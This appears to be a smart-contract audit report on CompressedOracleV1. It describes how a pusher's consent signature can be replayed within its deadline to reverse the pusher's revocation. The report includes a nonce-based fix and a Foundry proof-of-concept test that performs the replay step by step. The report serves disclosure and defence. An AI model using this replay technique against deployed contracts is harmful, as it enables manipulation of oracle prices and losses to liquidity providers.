### Title
Pusher Delegation Consent Signature Is Replayable Within Its Deadline Window, Allowing Creator to Nullify a Pusher's `revokePusher()` Call and Force Continued Namespace Writes — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` verifies a pusher's EIP-191 consent signature but includes no per-use nonce. The only replay guard is a deadline. Within that deadline window, a creator can call `allowPushers` a second time with the identical signature after the pusher has called `revokePusher()`, silently re-establishing the delegation the pusher just cancelled. The pusher's subsequent fallback pushes then land in the creator's namespace instead of their own, feeding unintended price data into the creator's oracle feed and, transitively, into any pool that reads it through `AnchoredPriceProvider`.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no used-signature bitmap, and no per-pusher revocation counter in the signed payload. The only expiry mechanism is `_ensureDeadline(deadline)`, which only rejects calls made after `deadline`. [2](#0-1) 

`revokePusher()` clears `namespaceRemapping[msg.sender]` to `address(0)`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But `allowPushers` unconditionally overwrites `namespaceRemapping[pusher]` with `msg.sender` whenever the signature verifies and the deadline has not passed. Because the signature is identical on every call (same `chainid`, `address(this)`, `deadline`, `pusher`, `creator`), the creator can replay it immediately after the pusher revokes, restoring `namespaceRemapping[pusher] = creator`.

The code comment on lines 186–191 explicitly acknowledges the problem ("an undated signature could re-establish a delegation AFTER the pusher revoked it") but incorrectly claims the deadline fixes it. The deadline only prevents replay after it expires — it does nothing to prevent replay within the window. [4](#0-3) 

After the delegation is silently re-established, the `fallback` push path resolves the namespace as:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So every subsequent push by the pusher lands in the creator's namespace, not the pusher's own, even though the pusher believes they have revoked.

---

### Impact Explanation

The oracle data written into the creator's namespace is consumed by `AnchoredPriceProvider._readLeg`, which calls `IPricedOracle(address(offchainOracle)).price(feedId, msg.sender)` and uses the result to compute `bid`/`ask` for live pool swaps: [6](#0-5) 

If the pusher, believing they have revoked, begins pushing data for a different feed, a different token pair, or a different price scale into what they think is their own namespace, that data instead overwrites the creator's oracle slots. The `AnchoredPriceProvider` then reads a corrupted mid price and spread, producing a wrong bid/ask that reaches pool swaps. Traders receive more output than the correct oracle price permits (swap conservation failure) or the pool receives less input than owed, constituting a direct loss of LP principal.

---

### Likelihood Explanation

The trigger requires only that:
1. A pusher signed a consent with a non-zero deadline (standard operational practice).
2. The pusher calls `revokePusher()` before the deadline expires.
3. The creator (who already holds the signature) calls `allowPushers` again with the same arguments.

Step 3 is a single public transaction requiring no special privilege. The creator is the natural party who initiated the delegation and already has the signature in hand. Any creator who wishes to retain a pusher's data feed against the pusher's will can execute this replay at zero cost, as many times as needed, until the deadline expires.

---

### Recommendation

Invalidate the consent signature on first use by recording a per-pusher nonce or a used-signature bitmap. The simplest fix is a `mapping(address => uint256) public pusherNonce` that is incremented on every successful `allowPushers` call and included in the signed digest:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- add nonce
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;        // <-- invalidate after use
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, record the used signature hash in a `mapping(bytes32 => bool) usedSignatures` set and revert if already consumed. Either approach ensures that `revokePusher()` cannot be silently undone by replaying the original consent.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from
    "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayAllowPushersAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

        // 3. Pusher revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — no revert, delegation restored.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);  // <-- replay succeeds
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "VULNERABILITY: revocation bypassed by signature replay");

        // 5. Pusher's subsequent push lands in creator's namespace, not their own.
        uint56 tsMs = uint56(block.timestamp * 1000);
        // Pusher pushes data they intend for their own namespace.
        bytes memory payload = abi.encodePacked(
            uint256(uint256(tsMs) << 8 | 0) | (uint256(0x0001000000000000) << 208)
        );
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(payload);
        assertTrue(ok);

        // Data landed in creator's namespace — wrong oracle feed gets updated.
        bytes32 creatorFeed = oracle.feedIdOf(creator, 0, 0);
        bytes32 pusherFeed  = oracle.feedIdOf(pusher,  0, 0);
        assertGt(oracle.getOracleData(creatorFeed).price, 0,
            "creator namespace polluted with pusher's unintended data");
        assertEq(oracle.getOracleData(pusherFeed).price, 0,
            "pusher's own namespace never updated");
    }
}
```

The test demonstrates that a single pusher signature, once obtained by the creator, can be replayed an unlimited number of times within the deadline window to nullify every `revokePusher()` call the pusher makes. Any pool whose `AnchoredPriceProvider` reads the creator's oracle feed will subsequently consume price data the pusher never intended to write there.

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }

    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
